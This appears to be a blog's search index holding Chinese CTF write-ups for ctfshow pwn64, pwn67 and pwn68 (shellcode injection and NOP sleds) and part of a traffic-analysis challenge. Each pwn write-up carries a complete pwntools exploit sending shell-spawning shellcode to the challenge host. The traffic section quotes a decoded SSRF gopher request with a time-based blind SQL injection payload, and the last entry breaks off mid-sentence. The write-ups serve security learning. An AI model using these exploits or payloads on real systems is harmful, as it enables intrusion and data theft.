<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ctfshow pwn入门 pwn64</title>
    <url>/2025/11/12/pwn64/</url>
    <content><![CDATA[<h2 id="pwn64"><a href="#pwn64" class="headerlink" title="pwn64"></a>pwn64</h2><p><a href="https://ctf.show/challenges#pwn64-4074">ctf.show pwn64</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#jump1">题目</a></li>
<li><a href="#jump2">预计时间</a></li>
<li><a href="#jump3">题目分析及截图</a></li>
</ul>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id='jump1'>题目</a></h4><img src="/2025/11/12/pwn64/1.png" class="" title="This is an image">

<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id ='jump2'>预计时间</a></h4><p>1h</p>
<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a>题目分析及截图</a></h4><p>我们先<code>checksec</code>一下看看程序的保护机制</p>
<img src="/2025/11/12/pwn64/2.png" class="" title="This is an image">

<p>可以看到NX保护机制是开启的，那么是不是就意味着<code>shellcode</code>用不了？？我们往下看看</p>
<p>我们用ida查看程序的main函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0</span>, <span class="number">0x400u</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0xAu</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Some different!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x400u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Illegal entry!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>buf = mmap(0, 0x400u, 7, 34, 0, 0);</code><ul>
<li><code>mmap</code>用于在进程的虚拟地址空间中<strong>创建一段内存映射</strong></li>
<li>第一个参数<code>0</code>：表示addr&#x3D;0，请求内核“直接给我一个地址”</li>
<li>第二个参数<code>0x400u</code>：表示length&#x3D;0x400u,请求映射的大小是0x400u</li>
<li>第三个参数<code>7</code>：这是权限位。<code>port_write = 1</code>,<code>port_read=2</code>,<code>port_e=4</code>,这里的7&#x3D;1+2+4，表示有可读可写可执行的权限</li>
</ul>
</li>
<li><code>read(0, buf, 0x400u) &lt; 0</code><ul>
<li><strong>第一个参数0</strong>的意思是输入<ul>
<li>0：输入</li>
<li>1：输出</li>
<li>2：标准错误</li>
</ul>
</li>
<li><code>&lt;0</code>是什么意思？<ul>
<li>read返回值&lt;0时，意味着读取失败</li>
<li>read正常返回时，值是实际读取的字符</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>**综上：**虽然我<code>checksec ./pwn</code>时开启了NX权限，但是在buf这一段缓冲区，因为<code>mmap</code>的原因，这一段是具有可读可写可执行权限的。</p>
<p><code>NX enabled</code> ≠ 全程禁止执行新内存：NX 是默认策略，程序可通过 <code>mmap</code>&#x2F;<code>mprotect</code> 申请可执行页（如果内核安全策略允许）。</p>
<p>到这里不难理解为什么题目描述是<strong>有时候开启某种保护并不代表这条路不通</strong>,就是上面的原因。我们依旧使用shellcode</p>
<p>exp如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28112</span>)</span><br><span class="line">shellcode = <span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line">payload = shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>至此，这道题就结束了</p>
<p>但是在我写的时候，我在疑惑它的偏移（我昏头了），因为这道题是不涉及栈溢出的，我们根本不需要去计算偏移去覆盖返回地址。但是本道题的目的是在buf中写入shellcode并调用它</p>
<p>希望可以帮到你，加油</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow pwn入门 pwn67</title>
    <url>/2025/11/16/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn67/</url>
    <content><![CDATA[<h2 id="pwn67"><a href="#pwn67" class="headerlink" title="pwn67"></a>pwn67</h2><p><a href="https://ctf.show/challenges#pwn67-4077">ctf.show pwn67</a> </p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#jump1">题目</a></li>
<li><a href="#jump2">预计时间</a></li>
<li><a href="#jump3">题目分析及截图</a></li>
</ul>
<hr>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id = "jump1">题目</a></h4><img src="/2025/11/16/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn67/1.png" class="" title="This is an image">

<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>5h</p>
<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="jump3">题目分析及截图</a></h4><p>题目标题是<code>nop sled</code>,我们先来说一下原理是什么</p>
<p><strong>NOP sled</strong> 是通过连续的 <strong>NOP</strong> 指令（通常是 <code>0x90</code>）在内存中构造一个 “滑道”，使得程序能够在没有精确控制跳转地址的情况下，依然能“滑行”到我们注入的 <strong>shellcode</strong>。这是一种应对 <strong>地址随机化</strong>（如 ASLR）和 <strong>精确跳转控制</strong> 不足的攻击技术。</p>
<p>我们首先使用<code>checksec ./pwn</code>看一下它的保护机制</p>
<img src="/2025/11/16/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn67/2.png" class="" title="This is an image">

<p>我们可以看到这是32位程序，开启了canary，但是NX没有开启，代表我们是可以进行shellcode注入的</p>
<p>我们打开ida查看程序的<strong>主函数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad sp value at call has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *position; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [esp+0h] [ebp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed[<span class="number">1027</span>]; <span class="comment">// [esp+4h] [ebp-100Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  seed[<span class="number">1025</span>] = (<span class="type">unsigned</span> <span class="type">int</span>)&amp;argc;</span><br><span class="line">  seed[<span class="number">1024</span>] = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)seed);</span><br><span class="line">  Loading();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  position = query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We need to load the ctfshow_flag.\nThe current location: %p\n&quot;</span>, position);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What will you do?\n&gt; &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">  v5();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>query_position函数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">query_position</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+3h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  v2 = rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">  v3 = &amp;v1 + v2;</span><br><span class="line">  <span class="keyword">return</span> &amp;v1 + v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码的逻辑：</strong></p>
<ol>
<li>程序会先输出一些字符，还有一个<strong>地址</strong>，根据query_position函数来看这个地址<code>position = &amp;v1+v2</code></li>
<li>程序让我们输入一串字符串（大小是4096）给到<code>seed变量</code></li>
<li>输入一串地址赋值给v5</li>
</ol>
<h5 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a><strong>大致思路：</strong></h5><p>在<code>checksec ./pwn</code>时，我们发现了有canary保护机制，如果平常的话，我们可能通过爆破canary来解这道题，但是本题需要我们去爆破canary吗？？</p>
<p><strong>首先</strong>，我们是通过往seed里面去写shellcode，在通过<code>scanf函数</code>输入v5的地址直接跳转到v5(我们的v5可以是shellcode的地址)，根本不需要用到canary，因为canary是用来保护返回地址的，而这道题我们<strong>不是用覆盖返回地址</strong>来写的，自然不用去爆破canary。</p>
<p><strong>再说的详细一点就是</strong></p>
<blockquote>
<p><strong>因为程序的漏洞点不是返回地址覆盖，而是可控函数指针 <code>v5</code>。</strong></p>
</blockquote>
<p>我们通过 <code>fgets</code> 往 seed[] 里写入了 shellcode，然后使用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">v5();</span><br></pre></td></tr></table></figure>

<p>直接控制程序跳转到 seed[]。<br> 整个过程不经过函数返回，也不会触发栈保护 Canary，因此不需要泄露或爆破 Canary</p>
<p>现在你应该知道为什么不需要爆破canary了</p>
<p><strong>现在我们要计算输入v5的地址是多少</strong></p>
<p>我画了一个栈的图更方便我们去理解（上面是高地址，下面是低地址）</p>
<img src="/2025/11/16/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn67/3.png" class="" title="style&#x3D;transform: scale(0.15); This is an image">

<ol>
<li><p>**v1距seed的距离：**v1的位置是<code>ebp-15h</code>那么它与query_position的ebp的距离是<code>15h</code></p>
</li>
<li><p><strong>输入v5的值：</strong></p>
<p>因为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v2 = rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">v3 = &amp;v1 + v2;</span><br><span class="line"><span class="keyword">return</span> &amp;v1 + v2;</span><br></pre></td></tr></table></figure>

<p>所以：</p>
<ul>
<li>position &#x3D; &amp;v1 + v2 &#x3D; &amp;v1 + rand() % 1337 - 668 （我们假设<code>rand()%1337</code>为random），所以 <strong>position &#x3D; &amp;v1 + random - 668</strong>(random ∈ [0,1336])</li>
<li>由上面可得<strong>v1&#x3D;position-random+668</strong></li>
<li>因为v1距seed的距离是0x2d，所以seed &#x3D; v1 + 0x2d &#x3D; position - random + 668 + 0x2d</li>
<li>因为我们输入的v5一定是在第一个nop之后，在shellcode之前的，我们可以让<code>v5 = position + 668 + 0x2d </code>,我们需要保证nop的长度在shellcode之前，所以我们可以让<strong>nop的长度&#x3D;1336</strong>（或者更长，但是加上shellcode,你不能超过seed的长度）</li>
</ul>
<p>现在就知道我们每一个数值都是多少了</p>
<ol>
<li>nop的长度是1336</li>
<li>v5&#x3D;position+668+0x2d</li>
</ol>
<p>构造exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28164</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;current location:&quot;</span>)</span><br><span class="line">position_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span>(position_addr)</span><br><span class="line">payload = <span class="string">b&quot;\x90&quot;</span> * <span class="number">1336</span> + asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入v5的地址</span></span><br><span class="line">v5_addr = position_addr + <span class="number">668</span> + <span class="number">0x2d</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(v5_addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><code>\x90</code>就是nop的机器码</li>
</ul>
<h4 id="我遇见的一些问题（可能会把你绕晕）"><a href="#我遇见的一些问题（可能会把你绕晕）" class="headerlink" title="我遇见的一些问题（可能会把你绕晕）"></a>我遇见的一些问题（可能会把你绕晕）</h4><ol>
<li><p>在query_position函数的汇编代码中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080487D1 ; __unwind &#123;</span><br><span class="line">.text:080487D1                 push    ebp</span><br><span class="line">.text:080487D2                 mov     ebp, esp</span><br><span class="line">.text:080487D4                 push    ebx</span><br><span class="line">.text:080487D5                 sub     esp, 14h</span><br><span class="line">.text:080487D8                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:080487DD                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:080487E2                 mov     ebx, large gs:14h</span><br><span class="line">.text:080487E9                 mov     [ebp+var_C], ebx</span><br><span class="line">.text:080487EC                 xor     ebx, ebx</span><br><span class="line">.text:080487EE                 mov     ebx, eax</span><br><span class="line">.text:080487F0                 call    _rand</span><br><span class="line">.text:080487F5                 mov     ecx, eax</span><br><span class="line">.text:080487F7                 mov     edx, 6208CECBh</span><br><span class="line">.text:080487FC                 mov     eax, ecx</span><br><span class="line">.text:080487FE                 imul    edx</span><br><span class="line">.text:08048800                 sar     edx, 9</span><br><span class="line">.text:08048803                 mov     eax, ecx</span><br><span class="line">.text:08048805                 sar     eax, 1Fh</span><br><span class="line">.text:08048808                 sub     edx, eax</span><br><span class="line">.text:0804880A                 mov     eax, edx</span><br><span class="line">.text:0804880C                 imul    eax, 539h</span><br><span class="line">.text:08048812                 sub     ecx, eax</span><br><span class="line">.text:08048814                 mov     eax, ecx</span><br><span class="line">.text:08048816                 sub     eax, 29Ch</span><br><span class="line">.text:0804881B                 mov     [ebp+var_14], eax</span><br><span class="line">.text:0804881E                 mov     eax, [ebp+var_14]</span><br><span class="line">.text:08048821                 lea     edx, [ebp+var_15]</span><br><span class="line">.text:08048824                 add     eax, edx</span><br><span class="line">.text:08048826                 mov     [ebp+var_10], eax</span><br><span class="line">.text:08048829                 mov     eax, [ebp+var_10]</span><br><span class="line">.text:0804882C                 mov     ebx, [ebp+var_C]</span><br><span class="line">.text:0804882F                 xor     ebx, large gs:14h</span><br><span class="line">.text:08048836                 jz      short loc_804883D</span><br><span class="line">.text:08048838                 call    __stack_chk_fail_local</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>在<code>.text:080487D5                 sub     esp, 14h</code>行，发现query_position函数栈帧给局部变量分配了14h的空间，但是v1的位置为什么是ebp-15h，那不应该分配15h的空间吗？？？</p>
<p>**答：**在<code>sub esp, 14h</code>这一行明确指定了栈帧的局部变量就是14h,这个是不可怀疑的。但是为什么v1在ebp-15h? </p>
<ul>
<li><strong><code>v1</code></strong> 的偏移是 <strong><code>ebp-0x15</code></strong>，是因为 <code>v1</code> 只是一个 1 字节的 <code>char</code> 类型，而栈对齐要求 <code>v2</code>（<code>int</code> 类型）必须按照 4 字节对齐。因此，在 <code>v1</code> 后面插入了 3 字节的填充。</li>
<li><strong><code>v2</code></strong> 紧接着 <code>v1</code> 后面，占用 4 字节，对齐到 4 字节边界。</li>
</ul>
<p><strong>所以，栈上的偏移量是 <code>ebp-0x15</code>，是由于填充字节的存在，符合 4 字节对齐规则。偏移量是相对 ebp 的，并不是要求 offset 最大值 &#x3D; 局部变量区大小</strong></p>
</li>
</ul>
<p>希望可以帮到你，加油！</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow pwn入门 pwn68</title>
    <url>/2025/11/17/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn68/</url>
    <content><![CDATA[<h2 id="pwn68"><a href="#pwn68" class="headerlink" title="pwn68"></a>pwn68</h2><p><a href="https://ctf.show/challenges#pwn68-4078">ctf.show pwn68</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#jump1">题目</a></li>
<li><a href="#jump2">预计时间</a></li>
<li><a href="#jump3">题目分析与截图</a></li>
</ul>
<hr>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id="jump1">题目</a></h4><img src="/2025/11/17/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn68/1.png" class="" title="This is an image">

<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>2h</p>
<h4 id="题目分析与截图"><a href="#题目分析与截图" class="headerlink" title="题目分析与截图"></a><a id="jump3">题目分析与截图</a></h4><blockquote>
<p><strong>nop seld</strong> 的原理我在pwn67的wp中提到，这里我不在说了</p>
</blockquote>
<p>这道题和前面的pwn67几乎是一样的题目，唯一不同就是pwn67是32位，pwn68是64位。</p>
<p>我们先<code>checksec</code>看一下程序的保护机制</p>
<img src="/2025/11/17/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn68/2.png" class="" title="This an image">

<p>和pwn67一样都是开启的canary但是没有开NX,那么我们仍然可以使用shellcode注入</p>
<p>我们先看一下ida反编译出来的 <strong>main函数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *position; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-1018h] BYREF</span></span><br><span class="line">  <span class="type">char</span> seed[<span class="number">4104</span>]; <span class="comment">// [rsp+10h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  logo();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)seed);</span><br><span class="line">  Loading();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  position = query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We need to load the ctfshow_flag.\nThe current location: %p\n&quot;</span>, position);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What will you do?\n&gt; &quot;</span>);</span><br><span class="line">  fgets(seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">  v5();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>query_position函数</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="type">char</span> *<span class="title function_">query_position</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Bh] [rbp-15h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v2 = rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">  <span class="keyword">return</span> &amp;v1 + v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>程序的逻辑：</strong></p>
</blockquote>
<ol>
<li>程序先输出一串字符串+position(query_position函数return的<code>&amp;v1+v2</code>)</li>
<li>用户输入一串长度为4096的字符串</li>
<li>输入v5的地址</li>
</ol>
<blockquote>
<p><strong>写题思路：</strong></p>
</blockquote>
<p>我们看main函数可以发现，栈中有一个大小为4096的seed数组并且需要我们自己写入，那么我们就可以将我们的shellcode写入，并且在程序提示我们要输入v5的地址时将我们shellcode的地址输入进去</p>
<p><strong>canary怎么办？？</strong></p>
<p>我们需要明白，canary是在返回地址的前面，当我们使用覆盖返回地址的方法来写shellcode时，我们才需要去处理shellcode，但是在这道题中我们并不使用覆盖返回地址的方法来写的，而是通过在seed中写入shellcode并且输入v5的地址跳转到shellcode</p>
<p><strong>我只是大致说一下思路，我并没有去考虑nop，所以我直接说的就是shellcode，但是并不影响</strong></p>
<p>我大致画了一下栈的布局</p>
<img src="/2025/11/17/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn68/3.jpg" alt="This an image" style="width:85%; height:auto;">

<p>我们这里需要算一下v5的位置，因为v5是需要我们输入的，并且程序会输出一个position（v1+v2），我们就可以利用position来反推v5的位置</p>
<p>我们一步一步来推导</p>
<ol>
<li>position &#x3D; &amp;v1 + v2</li>
<li>v2 &#x3D; rand() % 1337 - 668</li>
<li>position &#x3D; &amp;v1 + random()% 1337 - 668</li>
<li>v1 &#x3D; position - random()%1337 + 668</li>
<li><strong>v1到seed的距离：</strong> 0x15 + 0x8 + 0x8 + (1018h-1010h) &#x3D; 0x2d</li>
<li>seed的位置是：v1+0x2d &#x3D; position - random()%1337 + 668 + 0x2d</li>
<li>v5：position + 668 + 0x2d</li>
<li>nop的数量可以是：max（random()%1337）&#x3D; 1336</li>
</ol>
<p>所以我们的shellcode &#x3D; nop * 1336 + arm(shellcraft.sh())</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28242</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;current location:&quot;</span>)</span><br><span class="line">position_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span>(position_addr)</span><br><span class="line">payload = <span class="string">b&quot;\x90&quot;</span> * <span class="number">1336</span> + asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入v5的地址</span></span><br><span class="line">v5_addr = position_addr + <span class="number">668</span> + <span class="number">0x2d</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(v5_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>写exp的时候遇到了一个特别不起眼的问题，但是就是这个问题让我一直打不通</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendline(<span class="built_in">hex</span>(v5_addr))</span><br></pre></td></tr></table></figure>

<p>我这行原来写的是：<code>p.sendline(str(v5_addr))</code></p>
<p><code>str</code>与<code>hex</code>的区别就是</p>
<ul>
<li>当我使用<code>str</code>时，地址会转化成10进制，那么我们发送地址就会失败，不能打通</li>
<li>当我使用<code>hex</code>时，地址会转化成16进制，发送的地址就是16进制的，可以打通</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析1</title>
    <url>/2025/11/18/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901/</url>
    <content><![CDATA[<h2 id="流量分析1"><a href="#流量分析1" class="headerlink" title="流量分析1"></a>流量分析1</h2><p><a href="https://adworld.xctf.org.cn/challenges/list">攻防世界 流量分析1</a></p>
<span id="more"></span>

<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li><a href="#jump1">题目</a></li>
<li><a href="#jump2">预计时间</a></li>
<li><a href="#jump3">题目分析及截图</a></li>
</ul>
<hr>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id=" jump1">题目</a></h4><img src="/2025/11/18/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901/1.png" class="" title="This is an image">

<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>1h</p>
<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="jump3">题目分析及截图</a></h4><p>流量分析题我们先把http包筛选出来，<strong>为什么筛选http包？</strong></p>
<p>简单来说，看HTTP包时为了<strong>直接理解”用户在做什么”和应用在做什么</strong>，可以直接理解应用层意图</p>
<p>我们筛选出来http包之后，随机选择一个http包，右键追踪流，然后发现我们的请求有url编码</p>
<img src="/2025/11/18/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901/2.png" class="" title="This is an image">

<p>我们解码（解一次码之后还有url编码，那我们就再解一次），得到</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?url=gopher://127.0.0.1:80/_POST</span> /admin.php <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> localhost:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>80</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">id</span>=<span class="number">1</span>) and if((ascii(substr((select flag from flag),<span class="number">14</span>,<span class="number">1</span>))=&#x27;<span class="number">125</span>&#x27;),sleep(<span class="number">3</span>),<span class="number">0</span>) --  HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">39.105.136.196:30025</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: python-requests/<span class="number">2</span>.<span class="number">24</span>.<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>: */*</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Connection</span>: keep-alive</span></span><br></pre></td></tr></table></figure>



<p>关键句是<code>if((ascii(substr((select flag from flag),14,1))=&#39;125&#39;),sleep(3),0)</code></p>
<blockquote>
<p>查看flag表中flag值的第n个字符，如果这个字符是x (ASCII码为**)，那么就让数据库睡眠3秒钟；否则，就什么都不做（返回0）</p>
</blockquote>
<p>就是检验是否是flag里对应的字符，并且如果是flag里面的字符的话，睡眠3秒</p>
<p>那我们可以直接去搜索睡眠时间&gt;&#x3D;3秒的http包</p>
<img src="/2025/11/18/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901/3.png" class="" title="This is an image">

<p>我们从时间最长的包开始查看追踪流</p>
<img src="/2025/11/18/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%901/4.png" class="" title="This is an image">

<p>我们url解码再解码,得到</p>
